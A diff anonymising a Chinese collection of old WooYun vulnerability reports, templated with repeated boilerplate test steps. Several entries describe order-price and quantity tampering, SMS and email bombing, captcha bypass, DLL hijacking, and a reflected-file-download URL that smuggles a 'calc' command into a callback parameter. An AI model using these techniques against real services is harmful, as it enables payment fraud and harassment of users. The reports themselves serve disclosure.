+**详情**: 115浏览器最新版：正常而言，访问url链接的方式无外乎两种：window.open()location.href='xxx';但是因为chrome的严格限制，上面的2种api都是没办法访问chrome://协议的资源以及file://的资源的：通过上述2个api访问，弹出的只是about:blank，这种人畜无害的链接。（无法访问对应的资源的）通过对115浏览器自带api的研究，我发现有一个对象不需要特权域，你是用115浏览器的用户，就能调用该对象：browserInterface该对象又有一个方法：browserInterface.openSpecificURL();伪代码：browserInterface.openSpecificURL(url)此处我们仅仅需要传入一个url，通过该api，即可跨越浏览器边界，实现访问本地资源！构造好的poc：https://example.com/[已脱敏]
 
 **POC**: 当然，也可以调用本地的任意exe，只不过会显示没有数字签名：实际测试也能访问chrome://的内容。具体不表。
 
@@ -13657,7 +13657,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ控件appcom.dll同样对象没初始化,导致00000000地址访问错误(需要安装QQ)自评rank5是我还没有找到污染此对象的方法,但是不代表不可用.
+**详情**: 某互联网公司控件appcom.dll同样对象没初始化,导致00000000地址访问错误(需要安装某互联网公司)自评rank5是我还没有找到污染此对象的方法,但是不代表不可用.
 
 **POC**: 内存没有初始化,污染此对象可以挟持稍后的call [ecx+0xC]从而挟持eip
 
@@ -13668,7 +13668,7 @@
 
 ---
 ### [wooyun-2012-04821] 好友手机隐身可被检测
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -13789,7 +13789,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 刚在看漏洞，然后看到了如下的一个漏洞WooYun: 华三某系同弱口令导致泄露大量信息就去看看是不是已经修了，看了下果然修了，然后在仔细一看发现有个找回密码http://newlds-test.h3c.com/lds/sys_login.do第一步，需要填入用户名，输入admin然后下一步，需要验证邮箱查看源代码，发现是用ajax提交，然后本地使用js进行判断，因此恶意猜测返回内容中肯定有用户信息进行抓包果然发现管理员用户信息，将邮箱填进去，成功修改管理员用户密码
+**详情**: 刚在看漏洞，然后看到了如下的一个漏洞WooYun: 华三某系同弱口令导致泄露大量信息就去看看是不是已经修了，看了下果然修了，然后在仔细一看发现有个找回密码https://example.com/[已脱敏]
 
 **POC**: 再给一个信息泄漏的好多JAVA工程师阿
 
@@ -13811,7 +13811,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.aizhenghun.com先说下吧，我是有点心动了。 主要美女太多了，哎。没办法先给大家看下美女吧，放松放松找不到厂商 找腾讯去好了，太奇葩了， 价钱完全你说了算。 你就是开发人员3个你选择开哪个？ 还用问吗，肯定是最贵的，完全就是在坑， 3个月7999元， 我工资都没那么高
+**详情**: https://example.com/[已脱敏] 主要美女太多了，哎。没办法先给大家看下美女吧，放松放松找不到厂商 找某互联网公司去好了，太奇葩了， 价钱完全你说了算。 你就是开发人员3个你选择开哪个？ 还用问吗，肯定是最贵的，完全就是在坑， 3个月7999元， 我工资都没那么高
 
 **POC**: 重点来了 7999元然后，我了个去， 居然可以随便改价格，最低改1元，改0.9以下会出错有没有搞错哦， 价钱都可以随便改，一夜暴富， 可以卖小学生了
 
@@ -13833,7 +13833,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先打开http://shop.96877.net/product.do主页。注册个用户。选一个宽带套餐提交订单：然后进入支付界面：URL里面亮点自寻：进入支付宝付款，价格已经改掉了：
+**详情**: 首先打开https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13844,7 +13844,7 @@
 
 ---
 ### [wooyun-2015-0131428] 沃的城市生活IOS逻辑漏洞导致用户名密码泄露可登录任意账号
-**厂商**: 中国联通 | **年份**: 2015 | **类型**: 敏感信息泄露
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 敏感信息泄露
 
 **元思考**: 触发信号: 认证接口
 
@@ -13877,7 +13877,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、下单后选择支付2、查看链接发现价格直接明文显示在URL中http://shop.letv.com/user/center/orderPay.html?orderId=1309111506618&orderPrice=<code>7489</code>&payMentMethodId=ON-LEZF-ALIPAY-HVPS-CMB-DEBIT&stage=13、将价格改成0.1http://shop.letv.com/user/center/orderPay.html?orderId=1309111503377&orderPrice=0.1&payMentMethodId=ON-LEZF-ALIPAY-BALANCE-ALP&stage=1
+**详情**: 1、下单后选择支付2、查看链接发现价格直接明文显示在URL中https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -13901,7 +13901,7 @@
 
 **详情**: 今天vivo手机装了一个有意思的软件，最后发现卸载不掉，研究了一下是什么情况
 
-**POC**: 1. 手机未root2. 手机型号：3. 病毒软件http://pan.baidu.com/s/1hqEhkjy4. 使用系统自带的卸载和使用pm uninstall 卸载均报错，导致无法卸载。5. 错误原因：对包名的长度做判断，包名太长后，抛异常，导致无法卸载。（此病毒包名：jbkadedgiogedd.dooambofdmkjac.ceggghopiaeapo.bkilacoomapmlg.ajlipbomjikchn.gffijhogcffjmn.laoojnpfbebbha）影响：vivo手机的这个漏洞，导致在非root手机上没有任何办法可以卸载掉包名过长的app。不确定是否是vivo
+**POC**: 1. 手机未root2. 手机型号：3. 病毒软件https://example.com/[已脱敏] 使用系统自带的卸载和使用pm uninstall 卸载均报错，导致无法卸载。5. 错误原因：对包名的长度做判断，包名太长后，抛异常，导致无法卸载。（此病毒包名：jbkadedgiogedd.dooambofdmkjac.ceggghopiaeapo.bkilacoomapmlg.ajlipbomjikchn.gffijhogcffjmn.laoojnpfbebbha）影响：vivo手机的这个漏洞，导致在非root手机上没有任何办法可以卸载掉包名过长的app。不确定是否是vivo
 
 **绕过**: 直接利用
 
@@ -13921,7 +13921,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、注册一账号1@qq.com,登录界面不存在登录验证码和登录错误次数限制，目测可暴力破解，未去尝试2、好吧，这么多东西，就买一款诱惑香水吧，不知道能不能让女人发狂，有木有艳遇，什么叫吸引女人信息素的香水，尼玛，明明是性激素吧，小编，能不能专业点3、立即购买，截取数据包，把数量改为-14、提交订单，此时只需要支付19元邮费，价格不够包邮的、5、选择在线支付宝支付此时便产生了订单6、还可以选择货到付款订单提交成功了,就看发不发货了。
+**详情**: 1、注册一账号1@某互联网公司.com,登录界面不存在登录验证码和登录错误次数限制，目测可暴力破解，未去尝试2、好吧，这么多东西，就买一款诱惑香水吧，不知道能不能让女人发狂，有木有艳遇，什么叫吸引女人信息素的香水，尼玛，明明是性激素吧，小编，能不能专业点3、立即购买，截取数据包，把数量改为-14、提交订单，此时只需要支付19元邮费，价格不够包邮的、5、选择在线某电商平台支付此时便产生了订单6、还可以选择货到付款订单提交成功了,就看发不发货了。
 
 **POC**: 如上
 
@@ -13943,7 +13943,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先  先把东西加入购物车然后去付款此处抓包走起支付宝还剩下3块钱  认同割爱的支付了看到这一幕  眼泪哗哗直下   正当我以为没有支付漏洞时我点击了一下空间管理突然感觉世界慢慢的 都是爱还有  这个  本来想测试一下有没有漏洞  的  不过暂时还没发现
+**详情**: 首先  先把东西加入购物车然后去付款此处抓包走起某电商平台还剩下3块钱  认同割爱的支付了看到这一幕  眼泪哗哗直下   正当我以为没有支付漏洞时我点击了一下空间管理突然感觉世界慢慢的 都是爱还有  这个  本来想测试一下有没有漏洞  的  不过暂时还没发现
 
 **POC**: (见原文)
 
@@ -13953,8 +13953,8 @@
 ---
 
 ---
-### [wooyun-2015-098762] 中国电信某分公司云计算中心支付逻辑漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2015-098762] 某运营商某分公司云计算中心支付逻辑漏洞
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -13965,7 +13965,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.datacarrier.cn/原件1210的东西，现在只需要280
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 原件1210的东西，现在只需要280
 
@@ -13975,8 +13975,8 @@
 ---
 
 ---
-### [wooyun-2015-0161355] 腾讯讨论组QQ转QQ群无需确认可被用来推送广告
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0161355] 某互联网公司讨论组某互联网公司转某互联网公司群无需确认可被用来推送广告
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -13997,8 +13997,8 @@
 ---
 
 ---
-### [wooyun-2012-06552] 关于腾讯科技手机令牌的时间的相关漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-06552] 关于某互联网公司科技手机令牌的时间的相关漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -14009,18 +14009,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 不知道在场的各位有没有使用过腾讯手机令牌，但是据本人分析，若将一个未来的时间调整到手机令牌上，手机就会出现一个未来的令牌号码，若不法分子收集了足够的QQ令牌的未来密码，就所以让用户失去QQ账号的控制权，给各位用户带来很大的麻烦，虽然在独立的手机令牌程序中有启动密码，但是手机QQ内置的手机令牌和手机管家中内置的手机令牌且无此功能，望腾讯改正！
+**详情**: 不知道在场的各位有没有使用过某互联网公司手机令牌，但是据本人分析，若将一个未来的时间调整到手机令牌上，手机就会出现一个未来的令牌号码，若不法分子收集了足够的某互联网公司令牌的未来密码，就所以让用户失去某互联网公司账号的控制权，给各位用户带来很大的麻烦，虽然在独立的手机令牌程序中有启动密码，但是手机某互联网公司内置的手机令牌和手机管家中内置的手机令牌且无此功能，望某互联网公司改正！
 
 **POC**: 亲可以自己试试
 
 **绕过**: 直接利用
 
-**修复**: 增加全面的手机令牌的代码，并且不定期的更新手机令牌的时间随机列表，更好的就是可以让用户来随机更换手机令牌的加密算法或者在手机上手动调整QQ令牌的时间的时候需要通过第二代加密认证，可有效处理此类办法
+**修复**: 增加全面的手机令牌的代码，并且不定期的更新手机令牌的时间随机列表，更好的就是可以让用户来随机更换手机令牌的加密算法或者在手机上手动调整某互联网公司令牌的时间的时候需要通过第二代加密认证，可有效处理此类办法
 ---
 
 ---
-### [wooyun-2015-0100022] 京东金融android app Activity组件暴露
-**厂商**: 京东商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0100022] 某电商平台金融android app Activity组件暴露
+**厂商**: 某电商平台商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -14063,8 +14063,8 @@
 ---
 
 ---
-### [wooyun-2012-014750] 腾讯QQ短信轰炸
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-014750] 某互联网公司某互联网公司短信轰炸
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -14075,7 +14075,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯QQ手机注册zc.qq.com/chs/index.html先把信息填好，然后点击立即注册发送验证码时候虽然页面提示要30秒，但是用工具抓包，然后repeat一下，可以无限发，而且手机号码也可以修改为别的，用来做轰炸器不错
+**详情**: 某互联网公司某互联网公司手机注册zc.某互联网公司.com/chs/index.html先把信息填好，然后点击立即注册发送验证码时候虽然页面提示要30秒，但是用工具抓包，然后repeat一下，可以无限发，而且手机号码也可以修改为别的，用来做轰炸器不错
 
 **POC**: 如上
 
@@ -14173,8 +14173,8 @@
 ---
 
 ---
-### [wooyun-2014-088446] 腾讯手机QQ安卓版本在低于4.4.2以下存在跨域漏洞问题
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-088446] 某互联网公司手机某互联网公司安卓版本在低于4.4.2以下存在跨域漏洞问题
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -14251,7 +14251,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 综述：访问小米的手机找回官网http://i.xiaomi.com 可以发起手机找回功能的请求。该功能和手机配合的时候，默认是通过网络信道（如WiFi，3G，4G等）进行请求/响应。但是，如果将网络信道关闭，则只能通过小米科技的短信网关进行手机找回功能的操作。我发现小米没有对短信的请求命令来源做检查，于是有了如下报告。攻击方式：将网络信道完全关闭，如数据通道、WiFi关闭。1、假设小米手机的账号是18512345678，使用该手机账户登陆http://i.xiaomi.com，关闭原来的小米手机的数据通信和WiFi，并插上另外一张电话卡，假设是13343214321.2、把18512345678的电话卡插在任一一台非小米科技的手机上，然后在http://i.xiaomi.com上发起手机响铃告警的请求。如果没什么意外，18512345678会收到如下格式的短信：mfc,n,35891234
+**详情**: 综述：访问小米的手机找回官网https://example.com/[已脱敏] 可以发起手机找回功能的请求。该功能和手机配合的时候，默认是通过网络信道（如WiFi，3G，4G等）进行请求/响应。但是，如果将网络信道关闭，则只能通过小米科技的短信网关进行手机找回功能的操作。我发现小米没有对短信的请求命令来源做检查，于是有了如下报告。攻击方式：将网络信道完全关闭，如数据通道、WiFi关闭。1、假设小米手机的账号是18512345678，使用该手机账户登陆https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -14261,8 +14261,8 @@
 ---
 
 ---
-### [wooyun-2012-08563] 无意中发现的支付宝信用卡充值，余额可提现
-**厂商**: 支付宝 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-08563] 无意中发现的某电商平台信用卡充值，余额可提现
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -14273,7 +14273,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 环境：iPhone银行：招行晚上无聊用手机看淘宝，随手买了件衣服，付款完成后回到“我的淘宝”，发现商品还是未付款，正纳闷呢，再次点付款，之后发现了原来那款项在“余额”那，看图吧
+**详情**: 环境：iPhone银行：招行晚上无聊用手机看某电商平台，随手买了件衣服，付款完成后回到“我的某电商平台”，发现商品还是未付款，正纳闷呢，再次点付款，之后发现了原来那款项在“余额”那，看图吧
 
 **POC**: 余额里39呢，把余额的勾勾去掉，选择其他付款方式，再复现一遍。手机银行-招商银行收到短信，打开链接，弹出浏览器支付完毕，看余额pc上看看
 
@@ -14284,7 +14284,7 @@
 
 ---
 ### [wooyun-2013-026219] 财付通商户版登录验证码绕过
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 参数注入, 认证接口
 
@@ -14295,7 +14295,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 财付通商户版登录的时候 多次登录失败 之后出现验证码 但是验证码可秒绕过 完全没用多次登录 密码错误之后出现验证码看链接http://mch.tenpay.com/?verify_code=1直接去掉参数 /?verify_code=1  就可以绕过属于验证码设计缺陷
+**详情**: 财付通商户版登录的时候 多次登录失败 之后出现验证码 但是验证码可秒绕过 完全没用多次登录 密码错误之后出现验证码看链接https://example.com/[已脱敏] /?verify_code=1  就可以绕过属于验证码设计缺陷
 
 **POC**: (见原文)
 
@@ -14317,7 +14317,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.打开 http://v9.demo.phpcms.cn/phpsso_server/?m=admin&c=login&a=init&forward=记下验证码此次验证码为hnmp2.打开防火墙，将以下两个地址加入黑名单1)http://v9.demo.phpcms.cn/phpsso_server/?m=admin&c=login&a=init&forward=2)http://v9.demo.phpcms.cn/phpsso_server/api.php?op=checkcode&code_len=4&font_size=14&width=84&height=24&font=&font_color=&background=3.构造Http 请求包4.发送后会返回用户不存在5.利用同样的数据包再次发送仍会提示用户不存在(注意两次用的是一个同一个验证码)
+**详情**: 1.打开 https://example.com/[已脱敏])https://example.com/[已脱敏])https://example.com/[已脱敏] 请求包4.发送后会返回用户不存在5.利用同样的数据包再次发送仍会提示用户不存在(注意两次用的是一个同一个验证码)
 
 **POC**: 详细说明中已经说了.利用这一过程可以进行fuzz
 
@@ -14339,7 +14339,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 淘宝上找了个虚拟主机供应商，长风网络，http://idc.feng511.com
+**详情**: 某电商平台上找了个虚拟主机供应商，长风网络，https://example.com/[已脱敏]
 
 **POC**: 首先注册一个帐号，登录后的个人界面如下：可以看到有虚拟主机能够购买，选一款主机购买启动burpsuite截获数据包将购买buymod改为-1，程序未进行逻辑验证提交引发出错，此时点go，可以看到主机价格变为0，如图示点击确认开通在主机管理页面了可以看到主机已经开通
 
@@ -14437,8 +14437,8 @@
 ---
 
 ---
-### [wooyun-2015-0148674] 中国电信网上营业厅逻辑漏洞可影响全用户详细个人信息/消费积分充话费/备份通讯录/绕过支付短信等（以某经纪人为例）
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0148674] 某运营商网上营业厅逻辑漏洞可影响全用户详细个人信息/消费积分充话费/备份通讯录/绕过支付短信等（以某经纪人为例）
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -14449,7 +14449,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信网上营业厅客户端app客户端打开随便选择一个功能，选择登陆登陆的时候的包，放掉，抓返回的包。返回来的包，拦截掉，然后修改为b5720f816f50db5eb94116fd795b9f770f4af1f252692aa8c138f0e8150856db0b52b7c8000a7be699aabc4ab106f380f9e488a10e8269792beb5b46a667cdf32e20cf7649e74841dcfc49d871e100bda5b005efdca1abf6d8f95b802b6db01dc0bc44d9f75be7b899fcac6bf3674bff51429cb76f9ea218fa2bad0b88a6c6c80d9edbb96f284e26c08a514ffe89869973b1d297873df3042f7fed5cff21498279cee5c1521deab
+**详情**: 某运营商网上营业厅客户端app客户端打开随便选择一个功能，选择登陆登陆的时候的包，放掉，抓返回的包。返回来的包，拦截掉，然后修改为b5720f816f50db5eb94116fd795b9f770f4af1f252692aa8c138f0e8150856db0b52b7c8000a7be699aabc4ab106f380f9e488a10e8269792beb5b46a667cdf32e20cf7649e74841dcfc49d871e100bda5b005efdca1abf6d8f95b802b6db01dc0bc44d9f75be7b899fcac6bf3674bff51429cb76f9ea218fa2bad0b88a6c6c80d9edbb96f284e26c08a514ffe89869973b1d297873df3042f7fed5cff21498279cee5c1521deab
 
 **POC**: 登录以后访问积分商城的，发现会有这么一条数据get出去，里面是包含着身份证信息，和姓名的。还有其他一些不知道什么鬼的。点击配送地址，抓包，可以看到返回信息里还是包含机主的地址信息。可以使用积分兑换来给兑换话费或者充值卡，和任意登录同理，支付时候修改2次返回包，第一次返回包附上以上提到的代码，第二次奖其中的0002改为0000即可成功支付无需发送验证码短信，附上充值话费成功截图
 
@@ -14471,7 +14471,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试时PPTV网络电视默认安装路径：C:\Program Files\PPLive\PPTV\具体利用方法：PPLive.exe运行时（包括播放视频时）会加载十个不存在的DLL文件分别为：C:\Program Files\PPLive\PPTV\3.3.8.0031\components\ppp.dllC:\Program Files\PPLive\PPTV\ieframe.dllC:\Program Files\PPLive\PPTV\vsfilter.langC:\Program Files\PPLive\PPTV\nvcuvid.dllC:\Program Files\PPLive\PPTV\openlc.dllC:\WINDOWS\system32\dwmapi.dllC:\Program Files\Common Files\PPLiveNetwork\1.0.1.4584\ke
+**详情**: 测试时PPTV网络电视默认安装路径：C:\Program Files\PPLive\PPTV\具体利用方法：PPLive.exe运行时（包括播放视频时）会加载十个不存在的DLL文件分别为：C:\Program Files\PPLive\PPTV\[IP已脱敏]1\components\ppp.dllC:\Program Files\PPLive\PPTV\ieframe.dllC:\Program Files\PPLive\PPTV\vsfilter.langC:\Program Files\PPLive\PPTV\nvcuvid.dllC:\Program Files\PPLive\PPTV\openlc.dllC:\WINDOWS\system32\dwmapi.dllC:\Program Files\Common Files\PPLiveNetwork\[IP已脱敏]4\ke
 
 **POC**: (见原文)
 
@@ -14537,7 +14537,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 现在的互联网公司，不玩金融都不好意思说是玩互联网的；就连咱大土牛也开始玩起了金融；问题1. 在购买礼品卡时，价格通过参数提交，可以随意更改价格；如下http://jr.tuniu.com/问题就出在礼品卡处；购买礼品卡，如下图所示：购买两张1000的卡；抓包修改价格：如下图所示，可以把1000改成10元，如下图所示签约成功，直接进入付款页面，如下图所示：只需要付款20元就可以了，如下图所示：太他妈爽了！付款，我这用不上，就不付款了；后面你懂的；
+**详情**: 现在的互联网公司，不玩金融都不好意思说是玩互联网的；就连咱大土牛也开始玩起了金融；问题1. 在购买礼品卡时，价格通过参数提交，可以随意更改价格；如下https://example.com/[已脱敏]
 
 **POC**: 如上以证明！
 
@@ -14559,9 +14559,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.junph.com/man/ 随便购买,:http://app.junph.com/Shopping/OrderInfo.aspx?sid=94a21bae-3720-4c0c-95f5-27c8634d0034#topform到了这一步然后支付宝支付懂的
+**详情**: https://example.com/[已脱敏] 随便购买,:https://example.com/[已脱敏]
 
-**POC**: http://www.junph.com/man/ 随便购买,:http://app.junph.com/Shopping/OrderInfo.aspx?sid=94a21bae-3720-4c0c-95f5-27c8634d0034#topform到了这一步然后支付宝支付懂的
+**POC**: https://example.com/[已脱敏] 随便购买,:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14583,7 +14583,7 @@
 
 **详情**: 1 登陆扫号，无验证码
 
-**POC**: 2 遍历删除收货地址http://www.fruitday.com/index.php/home/address/del/2179323返回{"error":0,"msg":"\u5220\u9664\u6210\u529f"}已删除
+**POC**: 2 遍历删除收货地址https://example.com/[已脱敏]"error":0,"msg":"\u5220\u9664\u6210\u529f"}已删除
 
 **绕过**: 直接利用
 
@@ -14591,8 +14591,8 @@
 ---
 
 ---
-### [wooyun-2013-041321] 京东某活动逻辑缺陷导致可刷京豆
-**厂商**: 京东商城 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2013-041321] 某电商平台某活动逻辑缺陷导致可刷京豆
+**厂商**: 某电商平台商城 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -14603,9 +14603,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://sale.jd.com/act/VCmd4BsWhaF.html这个活动，会有一个抽奖，ajax请求，没有做严格的逻辑验证，在一定时间内持续请求就可以刷京豆，10，50个豆豆不等，虽然只是一毛，五毛的，不过如果被人发现了，未必不会注册N*100个新账号，刷出豆豆，然后购买QQ币等之类的东西洗钱，个人认为刷个几千上万块的还是很轻松的，我只是刷了几毛钱，就不要跨我省了
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://sale.jd.com/act/VCmd4BsWhaF.html这是活动地址，在打老虎结束以后，点击红盒子的时候，会发出请求，http://csc.jd.com/log.ashx?type1=d&type2=c&pin=username&uuid=1910228888&sid=1910228888|5&referrer=-&jinfo=UA-J2011-1||1||32-bit||1920x1080||zh-cn||UTF-8||%E6%89%93%E8%80%81%E8%99%8E%E6%B8%B8%E6%88%8F-%E5%8A%A8%E7%94%BB%E6%B8%B8%E6
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -14635,8 +14635,8 @@
 ---
 
 ---
-### [wooyun-2014-088533] QQ浏览器存在Reflected File Download Attack较为鸡肋
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-088533] 某互联网公司浏览器存在Reflected File Download Attack较为鸡肋
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -14647,13 +14647,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 由于QQ浏览器不是嵌入chrome的内核所以我们这里就用这个http://suggestion.baidu.com/su;/1.bat?wd=&cb=calc||&sid=1440_2031_1945_1788&t=1362056239875去下载一个文件，然后假使用户直接打开的话。那么会直接执行弹出计算器跟cmd.exe
+**详情**: 由于某互联网公司浏览器不是嵌入chrome的内核所以我们这里就用这个https://example.com/[已脱敏]
 
 **POC**: 这样这个漏洞形成的原因就很简明了，要符合几个条件：1.在返回中能看到我们的输入并且content-type的类型不是普通类型，json或者jsonp等等。。。2.url没有过滤或转义‘/’‘;’3.是下载类型。使用不完整的Content-Disposition:attachment或者是不符合http协议的content-type。原理上基本就这样了，至于利用上这的确是有一定的鸡肋！
 
 **绕过**: 直接利用
 
-**修复**: PPT里面还有关于如何修复，这里我就不说了，感兴趣的童鞋可以去看看，附上PPT下载地址：http://dakrsn0w.sectree.cn/RFD.pdf
+**修复**: PPT里面还有关于如何修复，这里我就不说了，感兴趣的童鞋可以去看看，附上PPT下载地址：https://example.com/[已脱敏]
 ---
 
 ---
@@ -14735,7 +14735,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.存在支付漏洞的是下面这个站点：好孩子集团网上旗舰店http://www.haohaizi.com/2.买一件小短裤送给灾区的小朋友吧，俺也是个很有爱心的人呢！3.抓包查看提交的信息：4.POST的数据中不难看出，虽然商品的金额使用goodsIds参数在服务器端获得，但是数量参数counts这里是不是能改下呢？尝试改成-1，点击forward提交：act=addCartGoods&goodsIds=1448279&counts=1&bigorsmalls=25.查看返回结果，金额确实也是负数了，怎么办！
+**详情**: 1.存在支付漏洞的是下面这个站点：好孩子集团网上旗舰店https://example.com/[已脱敏]
 
 **POC**: 6.再买两件衣服吧，一共只需要9元：7.点击结算，查看订单信息如下，嗯，加上18元的快递费，仍然只需要付27元哦！8.选择网上银行支付，支付的金额仍是27元哪！测试到这里就结束了，话说有礼物么？
 
@@ -14779,7 +14779,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1 邮箱绑定漏洞，可以任意轰炸任何邮箱。用qq邮箱测试了下，虽然腾讯对qq邮箱内容的显示有所优化，但是qq客户端会不断的弹出收到新邮件的消息，想当的蛋疼。（点击图片可以看大图）2 手机绑定处的验证漏洞，可以给任意手机号进行轰炸，虽然界面上有限制最少3分钟发一次（貌似是因为以前乌云上有人发过吧），但是还是可以通过charles等工具进行后台发送。所以说这样的限制是毫无意义的。。。既然可以短信轰炸了，那么问题就严重了，想轰炸谁就轰炸谁。或者轰炸自己，然后去找移动公司索赔。。。只有想不到，没有做不到。（点击图片可以看大图）
+**详情**: 1 邮箱绑定漏洞，可以任意轰炸任何邮箱。用某互联网公司邮箱测试了下，虽然某互联网公司对某互联网公司邮箱内容的显示有所优化，但是某互联网公司客户端会不断的弹出收到新邮件的消息，想当的蛋疼。（点击图片可以看大图）2 手机绑定处的验证漏洞，可以给任意手机号进行轰炸，虽然界面上有限制最少3分钟发一次（貌似是因为以前乌云上有人发过吧），但是还是可以通过charles等工具进行后台发送。所以说这样的限制是毫无意义的。。。既然可以短信轰炸了，那么问题就严重了，想轰炸谁就轰炸谁。或者轰炸自己，然后去找移动公司索赔。。。只有想不到，没有做不到。（点击图片可以看大图）
 
 **POC**: 看上面，很详细了。
 
@@ -14803,7 +14803,7 @@
 
 **详情**: 文件夹名漏洞c:\test\wooyun>md \\.\c:\test\wooyun\com1.wooyun设备名漏洞c:\test\wooyun>md \\.\c:\test\wooyun\com1.wooyun
 
-**POC**: 创建的目录，系统不允许删除。而在WIndows2003 和之前的版本。连文件夹里的内容也无法看到。通过网站访问时：http://abc.com/com1.wooyun/com1.wooyun.asp 却可以正常访问。
+**POC**: 创建的目录，系统不允许删除。而在WIndows2003 和之前的版本。连文件夹里的内容也无法看到。通过网站访问时：https://example.com/[已脱敏] 却可以正常访问。
 
 **绕过**: 直接利用
 
@@ -14845,7 +14845,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先百度到美的的ＩＭＳ然后各种登录尝试，在使用美的员工登录的时候，抓包发现点异常很明显，应该有注入丢到slqmap(以前还手工测试，有了工具，现在都懒了)看库表数据因为也不清楚业务逻辑，3000多张表，里面很多用户表，数据量太大，也不知道哪个表是什么功能，截其中一个表的count数据说明一下吧
+**详情**: 首先某搜索引擎到美的的ＩＭＳ然后各种登录尝试，在使用美的员工登录的时候，抓包发现点异常很明显，应该有注入丢到slqmap(以前还手工测试，有了工具，现在都懒了)看库表数据因为也不清楚业务逻辑，3000多张表，里面很多用户表，数据量太大，也不知道哪个表是什么功能，截其中一个表的count数据说明一下吧
 
 **POC**: (见原文)
 
@@ -14855,8 +14855,8 @@
 ---
 
 ---
-### [wooyun-2013-020995] QQ好友聊天发送文件给对方直接冻结对方QQ号码
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-020995] 某互联网公司好友聊天发送文件给对方直接冻结对方某互联网公司号码
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -14867,13 +14867,13 @@
